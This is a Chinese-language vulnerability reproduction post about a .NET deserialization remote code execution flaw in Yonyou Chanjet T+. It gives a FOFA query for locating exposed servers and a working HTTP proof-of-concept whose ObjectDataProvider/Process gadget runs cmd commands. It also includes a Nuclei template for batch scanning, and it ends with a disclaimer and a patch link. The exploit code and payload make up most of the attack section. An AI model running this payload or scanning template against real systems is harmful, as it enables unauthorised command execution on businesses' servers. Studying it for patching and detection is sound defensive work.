# 原创
：  漏洞复现--用友 畅捷通T+ .net反序列化RCE

# 漏洞复现--用友 畅捷通T+ .net反序列化RCE

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

畅捷通T+是一款新型互联网企业管理软件。 全面满足成长型小微企业对其灵活业务流程的管控需求，重点解决往来业务管理、订单跟踪、资金、库存等管理难题。该产品存在.net反序列化可导致RCE

### 二：漏洞影响版本

用友 畅捷通T+

### 三：网络空间测绘查询

fofa:<br/> `app="畅捷通-TPlus"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a6e3c453978f53b51502192a18f4e3e5.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/61419eea7006ec9521cdb9221814b7ee.jpeg"/><br/> POC:

```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
X-Ajaxpro-Method: GetStoreWarehouseByStore
Host: ip
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 597

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c whoami &gt; test.txt"
        }
    }
  }
}

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e248dfba170c5bcbc157966695354d6a.jpeg"/><br/> 访问执行命令的日志文件即test.txt<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/94e75d4e3315375b38225e26c13211e4.jpeg"/><br/> 执行ipconfig /all<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b115ab45dbc53eb3fbbe5c0cbbeab254.jpeg"/>

### 五：批量检测

```
id: changjietong_GetStoreWarehouseByStore_rce
info:
  name: 用友 畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞
  author: mhb17
  severity: critical
  description: 
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
requests:
  - raw:
      - |-
        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        X-Ajaxpro-Method: GetStoreWarehouseByStore
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-type: application/x-www-form-urlencoded
        Content-Length: 577

        {
          "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "StartInfo": {
                    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    "FileName":"cmd", "Arguments":"/c whoami &gt; {{file_name}}"
                }
            }
          }
        }
      - |+
        GET /tplus/{{file_name}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    req-condition: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains((body_1), "System.ArgumentException") &amp;&amp; status_code_2 == 200'

```

此脚本来自揽月安全团队<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/105e80e9156e586821d8772f93d44ead.jpeg"/>

### 六：修复建议

目前官方已发布补丁更新，建议受影响用户尽快安装<br/> https://www.chanjetvip.com/product/goods/detail?id=6077e91b70fa071069139f62
